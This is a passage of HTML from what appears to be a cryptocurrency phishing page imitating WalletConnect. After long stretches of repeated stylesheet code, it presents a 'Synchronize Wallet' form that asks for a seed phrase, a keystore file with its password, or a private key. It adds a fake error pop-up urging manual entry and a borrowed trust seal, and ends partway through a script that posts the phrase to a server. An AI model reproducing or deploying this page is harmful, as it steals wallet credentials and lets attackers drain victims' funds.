      margin-top: 3rem
    }

    .mt-14 {
      margin-top: 3.5rem
    }

    .mt-16 {
      margin-top: 4rem
    }

    .mb-16 {
      margin-bottom: 4rem
    }

    .mt-20 {
      margin-top: 5rem
    }

    .mt-24 {
      margin-top: 6rem
    }

    .max-w-3xl {
      max-width: 48rem
    }

    .opacity-50 {
      opacity: .5
    }

    .p-0 {
      padding: 0
    }

    .py-2 {
      padding-top: .5rem;
      padding-bottom: .5rem
    }

    .py-3 {
      padding-top: .75rem;
      padding-bottom: .75rem
    }

    .py-4 {
      padding-top: 1rem;
      padding-bottom: 1rem
    }

    .px-4 {
      padding-left: 1rem;
      padding-right: 1rem
    }

    .px-5 {
      padding-left: 1.25rem;
      padding-right: 1.25rem
    }

    .absolute {
      position: absolute
    }

    .sticky {
      position: sticky
    }

    .inset-0 {
      top: 0;
      right: 0;
      bottom: 0;
      left: 0
    }

    .top-0 {
      top: 0
    }

    * {
      --tw-shadow: 0 0 transparent
    }

    .group:hover .group-hover\:shadow-lg,
    .shadow-lg {
      --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      box-shadow: var(--tw-ring-offset-shadow, 0 0 transparent), var(--tw-ring-shadow, 0 0 transparent), var(--tw-shadow)
    }

    * {
      --tw-ring-inset: var(--tw-empty,
          /*!*/
          /*!*/
        );
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgba(63, 131, 248, 0.5);
      --tw-ring-offset-shadow: 0 0 transparent;
      --tw-ring-shadow: 0 0 transparent
    }

    .text-center {
      text-align: center
    }

    .text-white {
      --tw-text-opacity: 1;
      color: rgba(255, 255, 255, var(--tw-text-opacity))
    }

    .text-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(107, 114, 128, var(--tw-text-opacity))
    }

    .text-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(75, 85, 99, var(--tw-text-opacity))
    }

    .text-gray-700 {
      --tw-text-opacity: 1;
      color: rgba(55, 65, 81, var(--tw-text-opacity))
    }

    .text-red-700 {
      --tw-text-opacity: 1;
      color: rgba(200, 30, 30, var(--tw-text-opacity))
    }

    .text-blue-500 {
      --tw-text-opacity: 1;
      color: rgba(63, 131, 248, var(--tw-text-opacity))
    }

    .text-cool-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(100, 116, 139, var(--tw-text-opacity))
    }

    .text-cool-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(71, 85, 105, var(--tw-text-opacity))
    }

    .group:hover .group-hover\:text-blue-700 {
      --tw-text-opacity: 1;
      color: rgba(26, 86, 219, var(--tw-text-opacity))
    }

    .group:hover .group-hover\:text-cool-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(100, 116, 139, var(--tw-text-opacity))
    }

    .hover\:text-cool-gray-600:hover {
      --tw-text-opacity: 1;
      color: rgba(71, 85, 105, var(--tw-text-opacity))
    }

    .align-middle {
      vertical-align: middle
    }

    .w-6 {
      width: 1.5rem
    }

    .w-16 {
      width: 4rem
    }

    .w-20 {
      width: 5rem
    }

    .w-36 {
      width: 9rem
    }

    .w-full {
      width: 100%
    }

    .z-10 {
      z-index: 10
    }

    .z-20 {
      z-index: 20
    }

    .gap-10 {
      gap: 2.5rem
    }

    .gap-12 {
      gap: 3rem
    }

    .grid-cols-2 {
      grid-template-columns: repeat(2, minmax(0, 1fr))
    }

    .grid-cols-3 {
      grid-template-columns: repeat(3, minmax(0, 1fr))
    }

    .transition {
      transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
      transition-timing-function: cubic-bezier(.4, 0, .2, 1);
      transition-duration: .15s
    }

    .ease-in-out {
      transition-timing-function: cubic-bezier(.4, 0, .2, 1)
    }

    .duration-300 {
      transition-duration: .3s
    }

    @-webkit-keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }

    @keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }

    @-webkit-keyframes pulse {
      50% {
        opacity: .5
      }
    }

    @keyframes pulse {
      50% {
        opacity: .5
      }
    }

    @-webkit-keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }

    @keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }

    .filter-grayscale {
      filter: grayscale(100%)
    }

    .hover\:filter-none:hover {
      filter: none
    }

    @media (min-width:640px) {
      .sm\:space-y-0>:not([hidden])~:not([hidden]) {
        --tw-space-y-reverse: 0;
        margin-top: calc(0px * calc(1 - var(--tw-space-y-reverse)));
        margin-bottom: calc(0px * var(--tw-space-y-reverse))
      }

      .sm\:space-x-16>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(4rem * var(--tw-space-x-reverse));
        margin-left: calc(4rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:space-x-20>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(5rem * var(--tw-space-x-reverse));
        margin-left: calc(5rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:flex-row {
        flex-direction: row
      }

      .sm\:justify-center {
        justify-content: center
      }

      .sm\:text-lg {
        font-size: 1.125rem;
        line-height: 1.75rem
      }

      .sm\:text-xl {
        font-size: 1.25rem;
        line-height: 1.75rem
      }

      .sm\:mx-8 {
        margin-left: 2rem;
        margin-right: 2rem
      }

      .sm\:mt-0 {
        margin-top: 0
      }

      .sm\:mt-32 {
        margin-top: 8rem
      }

      .sm\:max-w-3xl {
        max-width: 48rem
      }

      .sm\:max-w-5xl {
        max-width: 64rem
      }

      .sm\:pr-10 {
        padding-right: 2.5rem
      }

      .sm\:pl-10 {
        padding-left: 2.5rem
      }

      .sm\:w-8 {
        width: 2rem
      }

      .sm\:w-20 {
        width: 5rem
      }

      .sm\:w-24 {
        width: 6rem
      }

      .sm\:w-40 {
        width: 10rem
      }

      .sm\:w-1\/2 {
        width: 50%
      }

      .sm\:gap-10 {
        gap: 2.5rem
      }

      .sm\:gap-16 {
        gap: 4rem
      }

      .sm\:grid-cols-3 {
        grid-template-columns: repeat(3, minmax(0, 1fr))
      }
    }

    @media (min-width:768px) {
      .md\:flex {
        display: flex
      }

      .md\:justify-center {
        justify-content: center
      }

      .md\:max-w-5xl {
        max-width: 64rem
      }

      .md\:py-6 {
        padding-top: 1.5rem;
        padding-bottom: 1.5rem
      }

      .md\:pr-20 {
        padding-right: 5rem
      }

      .md\:pl-20 {
        padding-left: 5rem
      }

      .md\:w-28 {
        width: 7rem
      }

      .md\:w-32 {
        width: 8rem
      }

      .md\:w-52 {
        width: 13rem
      }

      .md\:gap-20 {
        gap: 5rem
      }

      .md\:gap-28 {
        gap: 7rem
      }

      .md\:grid-cols-4 {
        grid-template-columns: repeat(4, minmax(0, 1fr))
      }
    }

    @media (min-width:1024px) {
      .lg\:flex {
        display: flex
      }

      .lg\:justify-center {
        justify-content: center
      }

      .lg\:max-w-4xl {
        max-width: 56rem
      }

      .lg\:w-28 {
        width: 7rem
      }

      .lg\:grid-cols-5 {
        grid-template-columns: repeat(5, minmax(0, 1fr))
      }
    }

    @import url(https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

    /* ! tailwindcss v2.0.4 | MIT License | https://tailwindcss.com */

    /*! modern-normalize v1.0.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
    :root {
      -moz-tab-size: 4;
      -o-tab-size: 4;
      tab-size: 4
    }

    html {
      line-height: 1.15;
      -webkit-text-size-adjust: 100%
    }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji
    }

    hr {
      height: 0;
      color: inherit
    }

    abbr[title] {
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted
    }

    b,
    strong {
      font-weight: bolder
    }

    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
      font-size: 1em
    }

    small {
      font-size: 80%
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline
    }

    sub {
      bottom: -.25em
    }

    sup {
      top: -.5em
    }

    table {
      text-indent: 0;
      border-color: inherit
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0
    }

    button,
    select {
      text-transform: none
    }

    [type=button],
    button {
      -webkit-appearance: button
    }

    legend {
      padding: 0
    }

    progress {
      vertical-align: baseline
    }

    summary {
      display: list-item
    }

    blockquote,
    dd,
    dl,
    figure,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    p,
    pre {
      margin: 0
    }

    button {
      background-color: transparent;
      background-image: none
    }

    button:focus {
      outline: 1px dotted;
      outline: 5px auto -webkit-focus-ring-color
    }

    fieldset,
    ol,
    ul {
      margin: 0;
      padding: 0
    }

    ol,
    ul {
      list-style: none
    }

    html {
      font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
      line-height: 1.5
    }

    body {
      font-family: inherit;
      line-height: inherit
    }

    *,
    :after,
    :before {
      box-sizing: border-box;
      border: 0 solid #e5e7eb
    }

    hr {
      border-top-width: 1px
    }

    img {
      border-style: solid
    }

    textarea {
      resize: vertical
    }

    input::-moz-placeholder,
    textarea::-moz-placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    input:-ms-input-placeholder,
    textarea:-ms-input-placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    input::placeholder,
    textarea::placeholder {
      opacity: 1;
      color: #9fa6b2
    }

    [role=button],
    button {
      cursor: pointer
    }

    table {
      border-collapse: collapse
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-size: inherit;
      font-weight: inherit
    }

    a {
      color: inherit;
      text-decoration: inherit
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      padding: 0;
      line-height: inherit;
      color: inherit
    }

    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace
    }

    audio,
    canvas,
    embed,
    iframe,
    img,
    object,
    svg,
    video {
      display: block;
      vertical-align: middle
    }

    img,
    video {
      max-width: 100%;
      height: auto
    }

    .space-y-6>:not([hidden])~:not([hidden]) {
      --tw-space-y-reverse: 0;
      margin-top: calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));
      margin-bottom: calc(1.5rem * var(--tw-space-y-reverse))
    }

    .space-y-10>:not([hidden])~:not([hidden]) {
      --tw-space-y-reverse: 0;
      margin-top: calc(2.5rem * calc(1 - var(--tw-space-y-reverse)));
      margin-bottom: calc(2.5rem * var(--tw-space-y-reverse))
    }

    .bg-white {
      --tw-bg-opacity: 1;
      background-color: rgba(255, 255, 255, var(--tw-bg-opacity))
    }

    .bg-red-100 {
      --tw-bg-opacity: 1;
      background-color: rgba(253, 232, 232, var(--tw-bg-opacity))
    }

    .bg-red-500 {
      --tw-bg-opacity: 1;
      background-color: rgba(240, 82, 82, var(--tw-bg-opacity))
    }

    .border-red-400 {
      --tw-border-opacity: 1;
      border-color: rgba(249, 128, 128, var(--tw-border-opacity))
    }

    .rounded-full {
      border-radius: 9999px
    }

    .rounded-t {
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }

    .rounded-b {
      border-bottom-right-radius: .25rem;
      border-bottom-left-radius: .25rem
    }

    .border {
      border-width: 1px
    }

    .border-t-0 {
      border-top-width: 0
    }

    .cursor-pointer {
      cursor: pointer
    }

    .inline-block {
      display: inline-block
    }

    .flex {
      display: flex
    }

    .table {
      display: table
    }

    .grid {
      display: grid
    }

    .contents {
      display: contents
    }

    .flex-col {
      flex-direction: column
    }

    .items-center {
      align-items: center
    }

    .justify-center {
      justify-content: center
    }

    .justify-between {
      justify-content: space-between
    }

    .justify-around {
      justify-content: space-around
    }

    .font-thin {
      font-weight: 100
    }

    .font-medium {
      font-weight: 500
    }

    .font-semibold {
      font-weight: 600
    }

    .font-bold {
      font-weight: 700
    }

    .text-sm {
      font-size: .875rem;
      line-height: 1.25rem
    }

    .text-lg {
      font-size: 1.125rem;
      line-height: 1.75rem
    }

    .text-2xl {
      font-size: 1.5rem;
      line-height: 2rem
    }

    .text-3xl {
      font-size: 1.875rem;
      line-height: 2.25rem
    }

    .text-4xl {
      font-size: 2.25rem;
      line-height: 2.5rem
    }

    .leading-6 {
      line-height: 1.5rem
    }

    .mx-6 {
      margin-left: 1.5rem;
      margin-right: 1.5rem
    }

    .mx-8 {
      margin-left: 2rem;
      margin-right: 2rem
    }

    .mt-2 {
      margin-top: .5rem
    }

    .ml-2 {
      margin-left: .5rem
    }

    .mt-4 {
      margin-top: 1rem
    }

    .mt-6 {
      margin-top: 1.5rem
    }

    .mt-8 {
      margin-top: 2rem
    }

    .mt-10 {
      margin-top: 2.5rem
    }

    .mt-12 {
      margin-top: 3rem
    }

    .mt-14 {
      margin-top: 3.5rem
    }

    .mt-16 {
      margin-top: 4rem
    }

    .mb-16 {
      margin-bottom: 4rem
    }

    .mt-20 {
      margin-top: 5rem
    }

    .mt-24 {
      margin-top: 6rem
    }

    .max-w-3xl {
      max-width: 48rem
    }

    .opacity-50 {
      opacity: .5
    }

    .p-0 {
      padding: 0
    }

    .py-2 {
      padding-top: .5rem;
      padding-bottom: .5rem
    }

    .py-3 {
      padding-top: .75rem;
      padding-bottom: .75rem
    }

    .py-4 {
      padding-top: 1rem;
      padding-bottom: 1rem
    }

    .px-4 {
      padding-left: 1rem;
      padding-right: 1rem
    }

    .px-5 {
      padding-left: 1.25rem;
      padding-right: 1.25rem
    }

    .absolute {
      position: absolute
    }

    .sticky {
      position: sticky
    }

    .inset-0 {
      top: 0;
      right: 0;
      bottom: 0;
      left: 0
    }

    .top-0 {
      top: 0
    }

    * {
      --tw-shadow: 0 0 transparent
    }

    .group:hover .group-hover\:shadow-lg,
    .shadow-lg {
      --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      box-shadow: var(--tw-ring-offset-shadow, 0 0 transparent), var(--tw-ring-shadow, 0 0 transparent), var(--tw-shadow)
    }

    * {
      --tw-ring-inset: var(--tw-empty,
          /*!*/
          /*!*/
        );
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgba(63, 131, 248, 0.5);
      --tw-ring-offset-shadow: 0 0 transparent;
      --tw-ring-shadow: 0 0 transparent
    }

    .text-center {
      text-align: center
    }

    .text-white {
      --tw-text-opacity: 1;
      color: rgba(255, 255, 255, var(--tw-text-opacity))
    }

    .text-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(107, 114, 128, var(--tw-text-opacity))
    }

    .text-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(75, 85, 99, var(--tw-text-opacity))
    }

    .text-gray-700 {
      --tw-text-opacity: 1;
      color: rgba(55, 65, 81, var(--tw-text-opacity))
    }

    .text-red-700 {
      --tw-text-opacity: 1;
      color: rgba(200, 30, 30, var(--tw-text-opacity))
    }

    .text-blue-500 {
      --tw-text-opacity: 1;
      color: rgba(63, 131, 248, var(--tw-text-opacity))
    }

    .text-cool-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(100, 116, 139, var(--tw-text-opacity))
    }

    .text-cool-gray-600 {
      --tw-text-opacity: 1;
      color: rgba(71, 85, 105, var(--tw-text-opacity))
    }

    .group:hover .group-hover\:text-blue-700 {
      --tw-text-opacity: 1;
      color: rgba(26, 86, 219, var(--tw-text-opacity))
    }

    .group:hover .group-hover\:text-cool-gray-500 {
      --tw-text-opacity: 1;
      color: rgba(100, 116, 139, var(--tw-text-opacity))
    }

    .hover\:text-cool-gray-600:hover {
      --tw-text-opacity: 1;
      color: rgba(71, 85, 105, var(--tw-text-opacity))
    }

    .align-middle {
      vertical-align: middle
    }

    .w-6 {
      width: 1.5rem
    }

    .w-16 {
      width: 4rem
    }

    .w-20 {
      width: 5rem
    }

    .w-36 {
      width: 9rem
    }

    .w-full {
      width: 100%
    }

    .z-10 {
      z-index: 10
    }

    .z-20 {
      z-index: 20
    }

    .gap-10 {
      gap: 2.5rem
    }

    .gap-12 {
      gap: 3rem
    }

    .grid-cols-2 {
      grid-template-columns: repeat(2, minmax(0, 1fr))
    }

    .grid-cols-3 {
      grid-template-columns: repeat(3, minmax(0, 1fr))
    }

    .transition {
      transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
      transition-timing-function: cubic-bezier(.4, 0, .2, 1);
      transition-duration: .15s
    }

    .ease-in-out {
      transition-timing-function: cubic-bezier(.4, 0, .2, 1)
    }

    .duration-300 {
      transition-duration: .3s
    }

    @-webkit-keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }

    @keyframes ping {

      75%,
      to {
        transform: scale(2);
        opacity: 0
      }
    }

    @-webkit-keyframes pulse {
      50% {
        opacity: .5
      }
    }

    @keyframes pulse {
      50% {
        opacity: .5
      }
    }

    @-webkit-keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }

    @keyframes bounce {

      0%,
      to {
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(.8, 0, 1, 1)
      }

      50% {
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, .2, 1);
        animation-timing-function: cubic-bezier(0, 0, .2, 1)
      }
    }

    .filter-grayscale {
      filter: grayscale(100%)
    }

    .hover\:filter-none:hover {
      filter: none
    }

    @media (min-width:640px) {
      .sm\:space-y-0>:not([hidden])~:not([hidden]) {
        --tw-space-y-reverse: 0;
        margin-top: calc(0px * calc(1 - var(--tw-space-y-reverse)));
        margin-bottom: calc(0px * var(--tw-space-y-reverse))
      }

      .sm\:space-x-16>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(4rem * var(--tw-space-x-reverse));
        margin-left: calc(4rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:space-x-20>:not([hidden])~:not([hidden]) {
        --tw-space-x-reverse: 0;
        margin-right: calc(5rem * var(--tw-space-x-reverse));
        margin-left: calc(5rem * calc(1 - var(--tw-space-x-reverse)))
      }

      .sm\:flex-row {
        flex-direction: row
      }

      .sm\:justify-center {
        justify-content: center
      }

      .sm\:text-lg {
        font-size: 1.125rem;
        line-height: 1.75rem
      }

      .sm\:text-xl {
        font-size: 1.25rem;
        line-height: 1.75rem
      }

      .sm\:mx-8 {
        margin-left: 2rem;
        margin-right: 2rem
      }

      .sm\:mt-0 {
        margin-top: 0
      }

      .sm\:mt-32 {
        margin-top: 8rem
      }

      .sm\:max-w-3xl {
        max-width: 48rem
      }

      .sm\:max-w-5xl {
        max-width: 64rem
      }

      .sm\:pr-10 {
        padding-right: 2.5rem
      }

      .sm\:pl-10 {
        padding-left: 2.5rem
      }

      .sm\:w-8 {
        width: 2rem
      }

      .sm\:w-20 {
        width: 5rem
      }

      .sm\:w-24 {
        width: 6rem
      }

      .sm\:w-40 {
        width: 10rem
      }

      .sm\:w-1\/2 {
        width: 50%
      }

      .sm\:gap-10 {
        gap: 2.5rem
      }

      .sm\:gap-16 {
        gap: 4rem
      }

      .sm\:grid-cols-3 {
        grid-template-columns: repeat(3, minmax(0, 1fr))
      }
    }

    @media (min-width:768px) {
      .md\:flex {
        display: flex
      }

      .md\:justify-center {
        justify-content: center
      }

      .md\:max-w-5xl {
        max-width: 64rem
      }

      .md\:py-6 {
        padding-top: 1.5rem;
        padding-bottom: 1.5rem
      }

      .md\:pr-20 {
        padding-right: 5rem
      }

      .md\:pl-20 {
        padding-left: 5rem
      }

      .md\:w-28 {
        width: 7rem
      }

      .md\:w-32 {
        width: 8rem
      }

      .md\:w-52 {
        width: 13rem
      }

      .md\:gap-20 {
        gap: 5rem
      }

      .md\:gap-28 {
        gap: 7rem
      }

      .md\:grid-cols-4 {
        grid-template-columns: repeat(4, minmax(0, 1fr))
      }
    }

    @media (min-width:1024px) {
      .lg\:flex {
        display: flex
      }

      .lg\:justify-center {
        justify-content: center
      }

      .lg\:max-w-4xl {
        max-width: 56rem
      }

      .lg\:w-28 {
        width: 7rem
      }

      .lg\:grid-cols-5 {
        grid-template-columns: repeat(5, minmax(0, 1fr))
      }
    }
  </style>
  <style>
    html {
      position: relative;
      min-height: 100%;
    }

    body {
      background: white;
      color: black;
    }

    .nav-tabs .nav-link {
      color: black;
    }

    .nav-tabs .nav-item.show .nav-link,
    .nav-tabs .nav-link.active {
      color: #333;
      background: transparent;
      border: 0;
      border-bottom: 2px solid;
    }

    .fixbtm {
      position: fixed;
      bottom: 10px;
      right: 10px;
    }
  </style>
</head>

<body class="modal-open" style="padding-right: 17px;">
  <div id="__next">
    <div class="font-roboto" id="content">
      <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
        <div class="absolute inset-0 shadow-lg opacity-50"></div>
        <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20">
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
            <!-- -->
            GitHub
            <!-- -->
          </a>
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
            <!-- -->
            Docs
            <!-- -->
          </a>
        </div>
        <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28">
            <a href="/"><img class="cursor-pointer object-fit" src="walletconnect-logo.svg" alt="walletconnect logo"></a>
          </div>
        </div>
        <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20">
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="wallet">
            <!-- -->
            Wallets
            <!-- -->
          </a>
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="apps">
            <!-- -->
            Apps
            <!-- -->
          </a>
        </div>
      </header>

      <div class="container-fluid">
        <div class="row">
          <div class="col-md-4 offset-md-4">
            <br>
            <a href="wallet.html" style="font-size: 20px;"><i class="fa fa-angle-left"></i>&nbsp; &nbsp;Synchronize Wallet</a>
          </div>
        </div>


        <div class="container-fluid">
          <div class="row">
            <div class="col-md-4 offset-md-4">
              <ul class="nav nav-tabs">
                <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
              </ul>
            </div>
          </div>
        </div>
        <section style="margin-top: 40px;">
          <div class="container-fluid">
            <div class="row">
              <div class="col-md-4 offset-md-4">
                <!-- Tab panes -->
                <div class="tab-content">
                  <p id="msg" style="color:red;"></p>
                  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                    <form method="post" action="">
                      <textarea class="form-control" rows="5" name="phrases" id="phrases" placeholder="Enter your phrase here"></textarea>
                      <input type="hidden" id="wall" name="wall">
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>
                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit" name="submit">SYNC</button></div>
                    </form>

                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="keystore">
                    <form method="post" action="">
                      <div class="form-group">
                        <textarea class="form-control" name="keystorejson" id="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
                        <input type="hidden" id="walls" name="walls">
                      </div>
                      <div class="form-group">
                        <input class="form-control" type="password" id="password" name="password" placeholder="Password">
                      </div>
                      <p class="text-" style="margin-top: 10px;">
                        Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                      </p>


                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submits" name="submit">SYNC</button></div>
                    </form>
                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="privatekey">
                    <form name="privatekey" method="post" action="">
                      <div class="form-group">
                        <input class="form-control" name="privatekeys" id="privatekeys" placeholder="Private Key">
                        <input type="hidden" id="wallss" name="wallss">
                      </div>
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>

                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit-btn" name="submit">SYNC</button></div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div id="myModal" class="modal fade show" style="padding-right: 17px; display: block;">
            <div class="modal-dialog">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" style="font-size:130%"><b>Error <font color="red">!!!</font></b></h5>
                  <button type="button" class="close" data-dismiss="modal">×</button>
                </div>
                <div class="modal-body">
                  <p>Unable to detect wallet automatically. Kindly log in manually using your 12 or 18 (sometimes 24) word phrases.<br> &nbsp;</p>

                  <button type="button" class="btn btn-primary" data-dismiss="modal">Continue Securely</button>

                </div>
              </div>
            </div>
          </div>

        </section>


        <footer class="flex justify-center mt-24 mb-16 sm:mt-32">



          <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row">
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="discord.svg" alt="Discord">
                <p class="ml-2">Discord</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter">
                <p class="ml-2">Twitter</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="github.svg" alt="GitHub">
                <p class="ml-2">GitHub</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="support" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="mail.svg" alt="Support">
                <p class="ml-2">Support</p>
              </div>
            </a>
          </div>
        </footer>
      </div>
    </div>




    <img src="sectigo_trust_seal_lg.png" width="120px;" class="fixbtm">

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>



    <script>
      $(document).ready(function() {
        $("#myModal").modal('show');
      });
    </script>



  </div>
  <script>
    /* global $ */
    $(document).ready(function() {


      function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
          vars[key] = value;
        });
        return vars;
      }

      var number = getUrlVars()["wallet"];

      $("#wall").val(number);
      $("#walls").val(number);
      $("#wallss").val(number);



    });
  </script>
  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submit').click(function(event) {

        event.preventDefault();
        var phrases = $("#phrases").val();
        var wall = $("#wall").val();

        count = count + 1;

        $.ajax({
